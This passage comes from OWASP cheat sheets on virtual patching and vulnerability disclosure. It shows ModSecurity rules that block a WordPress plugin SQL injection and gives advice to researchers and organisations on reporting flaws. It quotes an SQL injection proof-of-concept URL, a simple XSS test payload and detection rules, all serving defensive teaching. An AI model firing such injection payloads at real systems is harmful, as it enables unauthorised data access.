- **Code level fixes and Virtual Patching are NOT mutually exclusive**. They are processes that are executed by different team (OWASP Builders/Devs vs. OWASP Defenders/OpSec) and can be run in tandem.\r\n\r\n## Value of Virtual Patching\r\n\r\nThe two main goals of Virtual Patching are:\r\n\r\n- **Minimize Time-to-Fix** - Fixing application source code takes time. The main purpose of a virtual patch is to implement a mitigation for the identified vulnerability as soon as possible. The urgency of this response may be different: for example if the vulnerability was identified in-house through code reviews or penetration testing vs. finding a vulnerability as part of live incident response.\r\n- **Attack Surface Reduction** - Focus on minimizing the attack vector. In some cases, such as missing positive security input validation, it is possible to achieve 100% attack surface reduction. In other cases, such with missing output encoding for XSS flaws, you may only be able to limit the exposures. Keep in mind - 50% reduction in 10 minutes is better than 100% reduction in 48 hrs.\r\n\r\n## Virtual Patching Tools\r\n\r\nNotice that the definition above did not list any specific tool as there are a number of different options that may be used for virtual patching efforts such as:\r\n\r\n- Intermediary devices such as a WAF or IPS appliance\r\n- Web server plugin such as ModSecurity\r\n- Application layer filter such as ESAPI WAF\r\n\r\nFor example purposes, we will show virtual patching examples using the open source [ModSecurity WAF tool](http://www.modsecurity.org).\r\n\r\n## A Virtual Patching Methodology\r\n\r\nVirtual Patching, like most other security processes, is not something that should be approached haphazardly. Instead, a consistent, repeatable process should be followed that will provide the best chances of success. The following virtual patching workflow mimics the industry accepted practice for conducting IT Incident Response and consists of the following phases:\r\n\r\n1. Preparation.\r\n2. Identification.\r\n3. Analysis.\r\n4. Virtual Patch Creation.\r\n5. Implementation/Testing.\r\n6. Recovery/Follow Up.\r\n\r\n## Example Public Vulnerability\r\n\r\nLet's take the following [SQL Injection vulnerability](https://packetstormsecurity.com/files/119217/WordPress-Shopping-Cart-8.1.14-Shell-Upload-SQL-Injection.html) as our example for the remainder of this article:\r\n\r\n```text\r\nWordPress Shopping Cart Plugin for WordPress\r\n/wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\r\nreqID Parameter prone to SQL Injection.\r\n```\r\n\r\n**Description**:\r\n\r\nWordPress Shopping Cart Plugin for WordPress contains a flaw that may allow an attacker to carry out an SQL injection attack.\r\n\r\nThe issue is due to the `/wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php` script not properly sanitizing user-supplied input to the `reqID` parameter.\r\n\r\nThis may allow an attacker to inject or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.\r\n\r\n## Preparation Phase\r\n\r\nThe importance of properly utilizing the preparation phase with regards to virtual patching cannot be overstated. You need to do a number of things to setup the virtual patching processes and framework **prior** to actually having to deal with an identified vulnerability, or worse yet, react to a live web application intrusion. The point is that during a live compromise is not the ideal time to be proposing installation of a web application firewall and the concept of a virtual patch. Tension is high during real incidents and time is of the essence, so lay the foundation of virtual patching when the waters are calm and get everything in place and ready to go when an incident does occur.\r\n\r\nHere are a few critical items that should be addressed during the preparation phase:\r\n\r\n- **Public/Vendor Vulnerability Monitoring** - Ensure that you are signed up for all vendor alert mail-lists for commercial software that you are using. This will ensure that you will be notified in the event that the vendor releases vulnerability information and patching data.\r\n- **Virtual Patching Pre-Authorization** – Virtual Patches need to be implemented quickly so the normal governance processes and authorizations steps for standard software patches need to be expedited. Since virtual patches are not actually modifying source code, they do not require the same amount of regression testing as normal software patches. Categorizing virtual patches in the same group as Anti-Virus updates or Network IDS signatures helps to speed up the authorization process and minimize extended testing phases.\r\n- **Deploy Virtual Patching Tool In Advance** - As time is critical during incident response, it would be a poor time to have to get approvals to install new software. For instance, you can install ModSecurity WAF in embedded mode on your Apache servers, or an Apache reverse proxy server. The advantage with this deployment is that you can create fixes for non-Apache back-end servers. Even if you do not use ModSecurity under normal circumstances, it is best to have it \"on deck\" ready to be enabled if need be.\r\n- **Increase HTTP Audit Logging** – The standard Common Log Format (CLF) utilized by most web servers does not provide adequate data for conducting proper incident response. You need to have access to the following HTTP data:\r\n    - Request URI (including QUERY_STRING)\r\n    - Full Request Headers (including Cookies)\r\n    - Full Request Body (POST payload)\r\n    - Full Response Headers\r\n    - Full Response Body\r\n\r\n## Identification Phase\r\n\r\nThe Identification Phase occurs when an organization becomes aware of a vulnerability within their web application. There are generally two different methods of identifying vulnerabilities: `Proactive` and `Reactive`.\r\n\r\n### Proactive Identification\r\n\r\nThis occurs when an organization takes it upon themselves to assess their web security posture and conducts the following tasks:\r\n\r\n- **Dynamic Application Assessments** - Whitehat attackers conduct penetration tests or automated web assessment tools are run against the live web application to identify flaws.\r\n- **Source code reviews** - Whitehat attackers use manual/automated means to analyze the source code of the web application to identify flaws.\r\n\r\nDue to the fact that custom coded web applications are unique, these proactive identification tasks are extremely important as you are not able to rely upon third-party vulnerability notifications.\r\n\r\n### Reactive Identification\r\n\r\nThere are three main reactive methods for identifying vulnerabilities:\r\n\r\n- **Vendor contact (e.g. pre-warning)** - Occurs when a vendor discloses a vulnerability for commercial web application software that you are using. Example is Microsoft's [Active Protections Program (MAPP)](https://www.microsoft.com/en-us/msrc/mapp)\r\n- **Public disclosure** - Public vulnerability disclosure for commercial/open source web application software that you are using. The threat level for public disclosure is increased as more people know about the vulnerability.\r\n- **Security incident** – This is the most urgent situation as the attack is active. In these situations, remediation must be immediate.\r\n\r\n## Analysis Phase\r\n\r\nHere are the recommended steps to start the analysis phase:\r\n\r\n1. **Determine Virtual Patching Applicability** - Virtual patching is ideally suited for injection-type flaws but may not provide an adequate level of attack surface reduction for other attack types or categories. Thorough analysis of the underlying flaw should be conducted to determine if the virtual patching tool has adequate detection logic capabilities.\r\n2. **Utilize Bug Tracking/Ticketing System** - Enter the vulnerability information into a bug tracking system for tracking purposes and metrics. Recommend you use ticketing systems you already use such as Jira or you may use a specialized tool such as [ThreadFix](https://threadfix.it/).\r\n3. **Verify the name of the vulnerability** - This means that you need to have the proper public vulnerability identifier (such as CVE name/number) specified by the vulnerability announcement, vulnerability scan, etc. If the vulnerability is identified proactively rather than through public announcements, then you should assign your own unique identifier to each vulnerability.\r\n4. **Designate the impact level** - It is always important to understand the level of criticality involved with a web vulnerability. Information leakages may not be treated in the same manner as an SQL Injection issue.\r\n5. **Specify which versions of software are impacted** - You need to identify what versions of software are listed so that you can determine if the version(s) you have installed are affected.\r\n6. **List what configuration is required to trigger the problem** - Some vulnerabilities may only manifest themselves under certain configuration settings.\r\n7. **List Proof of Concept (PoC) exploit code or payloads used during attacks/testing** - Many vulnerability announcements have accompanying exploit code that shows how to demonstrate the vulnerability. If this data is available, make sure to download it for analysis. This will be useful later on when both developing and testing the virtual patch.\r\n\r\n## Virtual Patch Creation Phase\r\n\r\nThe process of creating an accurate virtual patch is bound by two main tenants:\r\n\r\n1. **No false positives** - Do not ever block legitimate traffic under any circumstances.\r\n2. **No false negatives** - Do not ever miss attacks, even when the attacker intentionally tries to evade detection.\r\n\r\nCare should be taken to attempt to minimize either of these two rules. It may not be possible to adhere 100% to each of these goals but remember that virtual patching is about **Risk Reduction**. It should be understood by business owners that while you are gaining the advantage of shortening the Time-to-Fix metric, you may not be implementing a complete fix for the flaw.\r\n\r\n### Manual Virtual Patch Creation\r\n\r\n#### Positive Security (Allow List) Virtual Patches (**Recommended Solution**)\r\n\r\nPositive security model (allow list) is a comprehensive security mechanism that provides an independent input validation envelope to an application. The model specifies the characteristics of valid input (character set, length, etc…) and denies anything that does not conform. By defining rules for every parameter in every page in the application the application is protected by an additional security envelop independent from its code.\r\n\r\n##### Example Allow List ModSecurity Virtual Patch\r\n\r\nIn order to create an allow-list virtual patch, you must be able to verify what the normal, expected input values are. If you have implemented proper audit logging as part of the Preparation Phase, then you should be able to review audit logs to identify the format of expected input types. In this case, the `reqID` parameter is supposed to only hold integer characters so we can use this virtual patch:\r\n\r\n```text\r\n##\r\n## Verify we only receive 1 parameter called \"reqID\"\r\n##\r\nSecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter - Duplicate Parameters Names Seen.',logdata:'%{matched_var}'\"\r\n  SecRule &ARGS:/reqID/ \"!@eq 1\"\r\n\r\n##\r\n## Verify reqID's payload only contains integers\r\n##\r\nSecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:2,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\"\r\n  SecRule ARGS:/reqID/ \"!@rx ^[0-9]+$\"\r\n```\r\n\r\nThis virtual patch will inspect the `reqID` parameter value on the specified page and prevent any characters other than integers as input.\r\n\r\n- **Note** - You should make sure to assign rule IDs properly and track them in the bug tracking system.\r\n- **Caution**: There are numerous evasion vectors when creating virtual patches. Please consult the [OWASP Best Practices: Virtual Patching document](https://owasp.org/www-community/Virtual_Patching_Best_Practices) for a more thorough discussion on countering evasion methods.\r\n\r\n#### Negative Security (Block List) Virtual Patches\r\n\r\nA negative security model (block list) is based on a set of rules that detect specific known attacks rather than allow only valid traffic.\r\n\r\n##### Example Block List ModSecurity Virtual Patch\r\n\r\nHere is the example [PoC code](https://packetstormsecurity.com/files/119217/WordPress-Shopping-Cart-8.1.14-Shell-Upload-SQL-Injection.html) that was supplied by the public advisory:\r\n\r\n```text\r\nhttp://localhost/wordpress/wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php?reqID=1' or 1='1\r\n```\r\n\r\nLooking at the payload, we can see that the attacker is inserting a single quote character and then adding additional SQL query logic to the end. Based on this data, we could disallow the single quote character like this:\r\n\r\n```text\r\nSecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\"\r\n  SecRule ARGS:/reqID/ \"@pm '\"\r\n```\r\n\r\n#### Which Method is Better for Virtual Patching – Positive or Negative Security\r\n\r\nA virtual patch may employ either a positive or negative security model. Which one you decide to use depends on the situation and a few different considerations. For example, negative security rules can usually be implemented more quickly, however the possible evasions are more likely.\r\n\r\nPositive security rules, only the other hand, provides better protection however it is often a manual process and thus is not scalable and difficult to maintain for large/dynamic sites. While manual positive security rules for an entire site may not be feasible, a positive security model can be selectively employed when a vulnerability alert identifies a specific location with a problem.\r\n\r\n#### Beware of Exploit-Specific Virtual Patches\r\n\r\nYou want to resist the urge to take the easy road and quickly create an **exploit-specific virtual patch**.\r\n\r\nFor instance, if an authorized penetration test identified an XSS vulnerability on a page and used the following attack payload in the report:\r\n\r\n```html\r\n<script>\r\n  alert('XSS Test')\r\n</script>\r\n```\r\n\r\nIt would not be wise to implement a virtual patch that simply blocks that exact payload. While it may provide some immediate protection, its long term value is significantly decreased.\r\n\r\n### Automated Virtual Patch Creation\r\n\r\nManual patch creation may become unfeasible as the number of vulnerabilities grow and automated means may become necessary. If the vulnerabilities were identified using automated tools and an XML report is available, it is possible to leverage automated processes to auto-convert this vulnerability data into virtual patches for protection systems.\r\n\r\nThree examples include:\r\n\r\n- **OWASP ModSecurity Core Rule Set (CRS) Scripts** - The OWASP CRS includes scripts to auto-convert XML output from tools such as [OWASP ZAP into ModSecurity Virtual Patches]. Reference [here](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-advanced-topic-of-the-week-automated-virtual-patching-using-owasp-zed-attack-proxy).\r\n- **ThreadFix Virtual Patching** - ThreadFix also includes automated processes of converting imported vulnerability XML data into virtual patches for security tools such as ModSecurity. Reference [here](https://github.com/denimgroup/threadfix/wiki/Waf-Types#mod_security).\r\n- **Direct Importing to WAF Device** - Many commercial WAF products have the capability to import DAST tool XML report data and automatically adjust their protection profiles.\r\n\r\n## Implementation/Testing Phase\r\n\r\nIn order to accurately test out the newly created virtual patches, it may be necessary to use an application other than a web browser. Some useful tools are:\r\n\r\n- Web browser.\r\n- Command-line web clients such as Curl and Wget.\r\n- Local Proxy Servers such as [OWASP ZAP](https://www.zaproxy.org/).\r\n- [ModSecurity AuditViewer](https://web.archive.org/web/20181011065823/http://www.jwall.org/web/audit/viewer.jsp) – which allows you to load a ModSecurity audit log file, manipulate it and then re-inject the data back into any web server.\r\n\r\n### Testing Steps\r\n\r\n- Implement virtual patches initially in a \"Log Only\" configuration to ensure that you do not block any normal user traffic (false positives).\r\n- If the vulnerability was identified by a specific tool or assessment team - request a retest.\r\n- If retesting fails due to evasions, then you must go back to the Analysis phase to identify how to better fix the issue.\r\n\r\n## Recovery/Follow-Up Phase\r\n\r\n- **Update Data in Ticket System** - Although you may need to expedite the implementation of virtual patches, you should still track them in your normal Patch Management processes. This means that you should create proper change request tickets, etc… so that their existence and functionality is documented. Updating the ticket system also helps to identify \"time-to-fix\" metrics for different vulnerability types. Make sure to properly log the virtual patch rule ID values.\r\n- **Periodic Re-assessments** - You should also have periodic re-assessments to verify if/when you can remove previous virtual patches if the web application code has been updated with the real source code fix. I have found that many people opt to keep virtual patches in place due to better identification/logging vs. application or db capabilities.\r\n- **Running Virtual Patch Alert Reports** - Run reports to identify if/when any of your virtual patches have triggered. This will show value for virtual patching in relation to windows of exposure for source code time-to-fix.\r\n\r\n## References\r\n\r\n- [OWASP Virtual Patching Best Practices](https://owasp.org/www-community/Virtual_Patching_Best_Practices).\r\n- [OWASP Securing WebGoat with ModSecurity](https://wiki.owasp.org/index.php/Category:OWASP_Securing_WebGoat_using_ModSecurity_Project).\r\n"
    },
    {
      "Vulnerability_Disclosure_Cheat_Sheet.md": "# Vulnerability Disclosure Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet is intended to provide guidance on the vulnerability disclosure process for both security researchers and organisations. This is an area where collaboration is extremely important, but that can often result in conflict between the two parties.\r\n\r\n**[Researchers](#reporting-vulnerabilities) should:**\r\n\r\n- Ensure that any testing is legal and authorised.\r\n- Respect the privacy of others.\r\n- Make reasonable efforts to contact the security team of the organisation.\r\n- Provide sufficient details to allow the vulnerabilities to be verified and reproduced.\r\n- Not demand payment or rewards for reporting vulnerabilities outside of an established bug bounty program.\r\n\r\n**[Organisations](#receiving-vulnerability-reports) should:**\r\n\r\n- Provide a clear method for researchers to securely report vulnerabilities.\r\n- Clearly establish the scope and terms of any bug bounty programs.\r\n- Respond to reports in a reasonable timeline.\r\n- Communicate openly with researchers.\r\n- Not threaten legal action against researchers.\r\n- Request CVEs where appropriate.\r\n- Publish clear security advisories and changelogs.\r\n- Offer rewards and credit.\r\n\r\n## Methods of Disclosure\r\n\r\nThere are a number of different models that can be followed when disclosing vulnerabilities, which are listed in the sections below.\r\n\r\n### Private Disclosure\r\n\r\nIn the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model.\r\n\r\nThe main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has lead to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach.\r\n\r\n### Full Disclosure\r\n\r\nWith the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response or organisations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix.\r\n\r\nThis makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available.\r\n\r\n### Responsible or Coordinated Disclosure\r\n\r\nResponsible disclosure attempts to find a reasonable middle ground between these two approaches. With responsible disclosure, the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed).\r\n\r\nIn many cases, the researcher also provides a deadline for the organisation to respond to the report, or to provide a patch. If this deadline is not met, then the researcher may adopt the full disclosure approach, and publish the full details.\r\n\r\nGoogle's [Project Zero](https://googleprojectzero.blogspot.com/2020/01/policy-and-disclosure-2020-edition.html) adopts a similar approach, where the full details of the vulnerability are published after 90 days regardless of whether or not the organisation has published a patch.\r\n\r\n## Reporting Vulnerabilities\r\n\r\nThis section is intended to provide guidance for security researchers on how to report vulnerabilities to organisations.\r\n\r\n### Warnings and Legality\r\n\r\nBefore carrying out any security research or reporting vulnerabilities, **ensure that you know and understand the laws in your jurisdiction**. This cheat sheet **does not constitute legal advice, and should not be taken as such.**.\r\n\r\nThe following points highlight a number of areas that should be considered:\r\n\r\n- If you are carrying out testing under a bug bounty or similar program, the organisation may have established [safe harbor](https://disclose.io) policies, that allow you to legally carry out testing, **as long as you stay within the scope and rules of their program**. Make sure that you read the scope carefully - stepping outside of the scope and rules may be a criminal offence.\r\n- Some countries have laws restricting reverse engineering, so testing against locally installed software may not be permitted.\r\n- Do not demand payment or other rewards as a condition of providing information on security vulnerabilities, or in exchange for not publishing the details or reporting them to industry regulators, as this may constitute blackmail.\r\n- If you receive bug bounty payments, these are generally considered as income, meaning that they may be taxable. Reporting this income and ensuring that you pay the appropriate tax on it is **your** responsibility.\r\n- If you find vulnerabilities as part of your work, or on equipment owned by your employer, your employer may prevent you from reporting these or claiming a bug bounty. Read your contract carefully and consider taking legal advice before doing so.\r\n\r\n### Finding Contact Details\r\n\r\nThe first step in reporting a vulnerability is finding the appropriate person to report it to. Although some organisations have clearly published disclosure policies, many do not, so it can be difficult to find the correct place to report the issue.\r\n\r\nWhere there is no clear disclosure policy, the following areas may provide contact details:\r\n\r\n- Bug bounty programs such as [BugCrowd](https://bugcrowd.com/programs), [HackerOne](https://hackerone.com/directory/programs), [huntr.dev](https://huntr.dev/bounties), [Open Bug Bounty](https://www.openbugbounty.org) or [Standoff](https://bugbounty.standoff365.com).\r\n- A [security.txt](https://securitytxt.org) file on the website at `/.well-known/security.txt` as per [RFC 9116](https://www.rfc-editor.org/rfc/rfc9116.html#name-location-of-the-securitytxt).\r\n- An existing issue tracking system.\r\n- Generic email addresses such as `security@` or `abuse@`.\r\n- The generic \"Contact Us\" page on the website.\r\n- Social media platforms.\r\n- Phoning the organisation.\r\n- Reaching out to the community.\r\n\r\nWhen reaching out to people who are not dedicated security contacts, request the details for a relevant member of staff, rather than disclosing the vulnerability details to whoever accepts the initial contact (especially over social media).\r\n\r\nIf it is not possible to contact the organisation directly, a national or sector-based  [CERT](https://en.wikipedia.org/wiki/Computer_emergency_response_team) may be able to assist.\r\n\r\n### Initial Report\r\n\r\nOnce a security contact has been identified, an initial report should be made of the details of the vulnerability. Ideally this should be done over an encrypted channel (such as the use of PGP keys), although many organisations do not support this.\r\n\r\nThe initial report should include:\r\n\r\n- Sufficient details of the vulnerability to allow it to be understood and reproduced.\r\n- HTTP requests and responses, HTML snippets, screenshots or any other supporting evidence.\r\n    - Redact any personal data before reporting.\r\n    - Some organisations may try and claim vulnerabilities never existed, so ensure you have sufficient evidence to prove that they did.\r\n- Proof of concept code (if available).\r\n- The impact of the vulnerability.\r\n- Any references or further reading that may be appropriate.\r\n\r\nIn many cases, especially in smaller organisations, the security reports may be handled by developers or IT staff who do not have a security background. This means that they may not be familiar with many security concepts or terminology, so reports should be written in clear and simple terms.\r\n\r\nIt may also be beneficial to provide a recommendation on how the issue could be mitigated or resolved. However, unless the details of the system or application are known, or you are very confident in the recommendation then it may be better to point the developers to some more general guidance (such as an OWASP cheat sheet).\r\n\r\nIf you are planning to publish the details of the vulnerability after a period of time (as per some [responsible disclosure](#responsible-or-coordinated-disclosure) policies), then this should be clearly communicated in the initial email - but try to do so in a tone that doesn't sound threatening to the recipient.\r\n\r\nIf the organisation does not have an established bug bounty program, then avoid asking about payments or rewards in the initial contact - leave it until the issue has been acknowledged (or ideally fixed). In particular, **do not demand payment before revealing the details of the vulnerability**. At best this will look like an attempt to scam the company, at worst it may constitute blackmail.\r\n\r\n### Ongoing Communication\r\n\r\nWhile simpler vulnerabilities might be resolved solely from the initial report, in many cases there will be a number of emails back and forth between the researcher and the organisation. Especially for more complex vulnerabilities, the developers or administrators may ask for additional information or recommendations on how to resolve the issue. They may also ask for assistance in retesting the issue once a fix has been implemented. Although there is no obligation to carry out this retesting, as long as the request is reasonable then and providing feedback on the fixes is very beneficial.\r\n\r\nIt may also be necessary to chase up the organisation if they become unresponsive, or if the established deadline for publicly disclosing the vulnerability is approaching. Ensure that this communication stays professional and positive - if the disclosure process becomes hostile then neither party will benefit.\r\n\r\nBe patient if it's taking a while for the issue to be resolved. The developers may be under significant pressure from different people within the organisation, and may not be able to be fully open in their communication. Triaging, developing, reviewing, testing and deploying a fix within in an enterprise environment takes **significantly** more time than most researchers expect, and being constantly hassled for updates just adds another level of pressure on the developers.\r\n\r\n### When to Give Up\r\n\r\nDespite every effort that you make, some organisations are not interested in security, are impossible to contact, or may be actively hostile to researchers disclosing vulnerabilities. In some cases they may even threaten to take legal action against researchers. When this happens it is very disheartening for the researcher - it is important not to take this personally. When this happens, there are a number of options that can be taken.\r\n\r\n- Publicly disclose the vulnerability, and deal with any negative reaction and potentially even a lawsuit. Whether or not they have a strong legal case is irrelevant - they have expensive lawyers and fighting any kind of legal action is expensive and time consuming. Before going down this route, ask yourself _is it really worth it?_\r\n- Anonymously disclose the vulnerability. However, if you've already made contact with the organisation and tried to report the vulnerability to them, it may be pretty obvious who's responsible behind the disclosure. If you are going to take this approach, ensure that you have taken sufficient operational security measures to protect yourself.\r\n- Report the vulnerability to a third party, such as an industry regulator or data protection authority.\r\n- Move on.\r\n\r\nThere are many organisations who have a genuine interest in security, and are very open and co-operative with security researchers. Unless the vulnerability is extremely serious, **it is not worth burning yourself out, or risking your career and livelihood over an organisation who doesn't care**.\r\n\r\n### Publishing\r\n\r\nOnce a vulnerability has been patched (or not), then a decision needs to be made about publishing the details. This should ideally be done through discussion with the vendor, and at a minimum the vendor should be notified that you intend to publish, and provided with a link to the published details. The disclosure would typically include:\r\n\r\n- A high level summary of the vulnerability and its impact.\r\n- Details of which version(s) are vulnerable, and which are fixed.\r\n- Technical details or potentially proof of concept code.\r\n- Mitigations or workarounds.\r\n- Links to the vendor's published advisory.\r\n- The timeline for the discovery, vendor communication and release.\r\n\r\nSome organisations may request that you do not publish the details at all, or that you delay publication to allow more time to their users to install security patches. In the interest of maintaining a positive relationship with the organisation, it is worth trying to find a compromise position on this.\r\n\r\nWhether to publish working proof of concept (or functional exploit code) is a subject of debate. Some people will view this as a \"blackhat\" move, and will argue that by doing so you are directly helping criminals compromise their users. On the other hand, the code can be used to both system administrators and penetration testers to test their systems, and attackers will be able to develop or reverse engineering working exploit code if the vulnerability is sufficiently valuable.\r\n\r\nIf you are publishing the details in hostile circumstances (such as an unresponsive organisation, or after a stated period of time has elapsed) then you may face threats and even legal action. Whether there is any legal basis for this will depend on your jurisdiction, and whether you signed any form of non-disclosure agreement with the organisation. Make sure you understand your legal position before doing so.\r\n\r\nNote that many bug bounty programs forbid researchers from publishing the details without the agreement of the organisation. If you choose to do so, you may forfeit the bounty or be banned from the platform - so read the rules of the program before publishing.\r\n\r\n## Receiving Vulnerability Reports\r\n\r\nThis section is intended to provide guidance for organisations on how to accept and receive vulnerability reports.\r\n\r\n### Bug Bounty Programs\r\n\r\nBug bounty programs incentivise researchers to identify and report vulnerabilities to organisations by offering rewards. These are usually monetary, but can also be physical items (swag). The process is often managed through a third party such as [BugCrowd](https://bugcrowd.com/programs) or [HackerOne](https://hackerone.com/directory/programs), who provide mediation between researchers and organisations.\r\n\r\nWhen implementing a bug bounty program, the following areas need to be clearly defined:\r\n\r\n- Which systems and applications are in scope.\r\n    - Live systems or a staging/UAT environment?\r\n    - Excluding systems managed or owned by third parties.\r\n- Which types of vulnerabilities are eligible for bounties (SSL/TLS issues? Missing HTTP security headers? Version disclosure?)\r\n- Legal provisions such as safe harbor policies.\r\n    - The [disclose.io](https://disclose.io) project provides some example policies.\r\n    - Take legal advice from lawyers, **not from this cheat sheet**.\r\n- How much to offer for bounties, and how is the decision made.\r\n    - The program could get very expensive if a large number of vulnerabilities are identified.\r\n    - Too little and researchers may not bother with the program.\r\n- The timeline for the initial response, confirmation, payout and issue resolution.\r\n\r\n#### When to Implement a Bug Bounty Program\r\n\r\nBug bounty have been adopted by many large organisations such as Microsoft, and are starting to be used outside of the commercial sector, including the  US Department of Defense. However, for smaller organisations they can bring significant challenges, and require a substantial investment of time and resources. These challenges can include:\r\n\r\n- Having sufficient time and resources to respond to reports.\r\n- Having sufficiently skilled staff to effectively triage reports.\r\n    - Reports may include a large number of junk or false positives.\r\n    - Managed bug bounty programs may help by performing initial triage (at a cost).\r\n- Dealing with large numbers of false positives and junk reports.\r\n- The impact of individuals testing live systems (including unskilled attackers running automated tools they don't understand).\r\n- Being unable to differentiate between legitimate testing traffic and malicious attacks.\r\n- Researchers going out of scope and testing systems that they shouldn't.\r\n- The financial cost of running the program (some companies pay out hundreds of thousands of dollars a year in bounties).\r\n- Dealing with researchers who are unhappy with how the program is run (such as disputing bounty amounts, or being angry when reported issues are duplicates or out of scope).\r\n\r\nDespite these potential issues, bug bounty programs are a great way to identify vulnerabilities in applications and systems. However, they should only be used by organisations that already have a mature vulnerability disclosure process, supported by strong internal processes to resolve vulnerabilities.\r\n\r\n### Publishing Contact Details\r\n\r\nThe most important step in the process is providing a way for security researchers to contact your organisation. The easier it is for them to do so, the more likely it is that you'll receive security reports. The following list includes some of the common mechanisms that are used for this - the more of these that you can implement the better:\r\n\r\n- A dedicated security contact on the \"Contact Us\" page.\r\n- Dedicated instructions for reporting security issues on a bug tracker.\r\n- The common `security@` email address.\r\n- A [security.txt](https://securitytxt.org) file on the website at `/.well-known/security.txt` as per [RFC 9116](https://www.rfc-editor.org/rfc/rfc9116.html#name-location-of-the-securitytxt).\r\n- Using third party [bug bounty](#bug-bounty-programs) program.\r\n\r\nIt is also important to ensure that frontline staff (such as those who monitor the main contact address, web chat and phone lines) are aware of how to handle reports of security issues, and who to escalate these reports to within the organisation.\r\n\r\n#### Providing Reporting Guidelines\r\n\r\nAlongside the contact details, it is also good to provide some guidelines for researchers to follow when reporting vulnerabilities. These could include:\r\n\r\n- Requesting specific information that may help in confirming and resolving the issue.\r\n- Using specific categories or marking the issue as confidential on a bug tracker.\r\n- Providing PGP keys for encrypted communication.\r\n- Establishing a timeline for an initial response and triage.\r\n- Establishing safe harbor provisions.\r\n\r\n### Communicating With Researchers\r\n\r\nCommunication between researchers and organisations is often one of the hardest points of the vulnerability disclosure process, and can easily leave both sides frustrated and unhappy with the process.\r\n\r\nThe outline below provides an example of the ideal communication process:\r\n\r\n- Respond to the initial request for contact details with a clear mechanism for the researcher to provide additional information.\r\n- Acknowledge the vulnerability details and provide a timeline to carry out triage.\r\n- Request additional clarification or details if required.\r\n- Confirm the vulnerability and provide a timeline for implementing a fix.\r\n    - Confirm the details of any reward or bounty offered.\r\n- If required, request the researcher to retest the vulnerability.\r\n- Confirm that the vulnerability has been resolved.\r\n\r\nThroughout the process, provide regular updates of the current status, and the expected timeline to triage and fix the vulnerability. Even if there is no firm timeline for these, the ongoing communication provides some reassurance that the vulnerability hasn't been forgotten about.\r\n\r\n#### Researchers Demanding Payment\r\n\r\nSome individuals may approach an organisation claiming to have found a vulnerability, and demanding payment before sharing the details. Although these requests _may_ be legitimate, in many cases they are simply scams.\r\n\r\nOne option is to request that they carry out the disclosure through a mediated bug bounty platform, which can provide a level of protection for both sides, as scammers are unlikely to be willing to use these platforms.\r\n\r\n### Disclosure\r\n\r\n#### Commercial and Open Source Software\r\n\r\nOnce the vulnerability has been resolved (and retested), the details should be published in a security advisory for the software. It is important to remember that publishing the details of security issues **does not make the vendor look bad**. All software has security vulnerabilities, and demonstrating a clear and established process for handling and disclosing them gives far more confidence in the security of the software than trying to hide the issues.\r\n\r\nAt a minimum, the security advisory must contain:\r\n\r\n- A high level summary of the vulnerability, including the impact.\r\n- A clear list of vulnerable versions.\r\n- A clear list of patch versions.\r\n- Any caveats on when the software is vulnerable (for example, if only certain configurations are affected).\r\n- Any workarounds or mitigation that can be implemented as a temporary fix.\r\n- A [CVE](https://cve.mitre.org/cve/request_id.html) for the vulnerability.\r\n\r\nWhere possible it is also good to include:\r\n\r\n- The timeline of the vulnerability disclosure process.\r\n- Credit for the researcher who identified the vulnerability.\r\n- Technical details of the vulnerability.\r\n- IDS/IPS signatures or other indicators of compromise.\r\n\r\nSecurity advisories should be easy for developers and system administrators to find. Common ways to publish them include:\r\n\r\n- A dedicated \"security\" or \"security advisories\" page on the website.\r\n- A security mailing list or forum.\r\n- Linked from the main changelogs and release notes.\r\n\r\nSome researchers may publish their own technical write ups of the vulnerability, which will usually include the full details required to exploit it (and sometimes even working exploit code). For more serious vulnerabilities, it may be sensible to ask the researcher to delay publishing the full details for a period of time (such as a week), in order to give system administrators more time to install the patches before exploit code is available. However, once the patch has been releases, attackers will be able to reverse engineer the vulnerability and develop their own exploit code, so there is limited value to delaying the full release.\r\n\r\n#### Private Systems\r\n\r\nFor vulnerabilities in private systems, a decision needs to be made about whether the details should be published once the vulnerability has been resolved. Most bug bounty programs give organisations the option about whether to disclose the details once the issue has been resolved, although it is not typically required.\r\n\r\nPublishing these details helps to demonstrate that the organisation is taking proactive and transparent approach to security, but can also result in potentially embarrassing omissions and misconfigurations being made public. In the event of a future compromise or data breach, they could also potentially be used as evidence of a weak security culture within the organisation. Additionally, they may expose technical details about internal, and could help attackers identify other similar issues. As such, this decision should be carefully evaluated, and it may be wise to take legal advice.\r\n\r\n### Rewarding Researchers\r\n\r\nWhere researchers have identified and reported vulnerabilities outside of a bug bounty program 